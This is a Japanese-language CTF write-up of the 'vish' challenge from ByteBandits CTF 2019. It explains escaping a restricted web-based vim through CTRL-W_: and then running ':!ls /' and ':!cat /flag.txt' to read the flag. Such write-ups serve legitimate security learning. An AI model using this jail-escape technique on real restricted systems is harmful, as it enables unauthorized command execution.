---
title: vish (ByteBandits CTF 2019)
date: 2019-04-13
tags: ["ByteBandits CTF 2019"]
categories: [CTF, misc]
---

{% asset_img problem.png %}

## 解説

とりあえず http://13.234.130.76:7003 にアクセスしてみる。

{% asset_img vim.png %}

最近使ったことがあるので `xterm.js` で `vim` のフロントエンドを作ってることはすぐにわかった。vim 系の問題は過去に何回かみたことがあって、基本的に無効化されたキー入力を突破してコマンドを実行する系だった。

今回の問題は `websockets` を使ってサーバーサイドで処理が行われているため、クライアントサイドをいじっても意味ない (たぶん)

とりあえず `vim` のマニュアル (日本語) を読み進めながら、1つずつ効果があるかどうか試していたところ [CTRL-W_:](https://vim-jp.org/vimdoc-ja/windows.html#CTRL-W_:) でコマンドが使えた。

あとは簡単で `:!ls /` でフラグっぽいのを探して

```
[No write since last change]
bin  boot  dev  etc  flag.txt  go  hello  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vim  vimrc

Press ENTER or type command to continue
```

`flag.txt` があったので、`:!cat /flag.txt` で終わり。

```
[No write since last change]
flag{bram_loves_jails}
```

## フラグ

`flag{bram_loves_jails}`

## 参考リソース

- [vimindex - Vim日本語ドキュメント](https://vim-jp.org/vimdoc-ja/vimindex.html)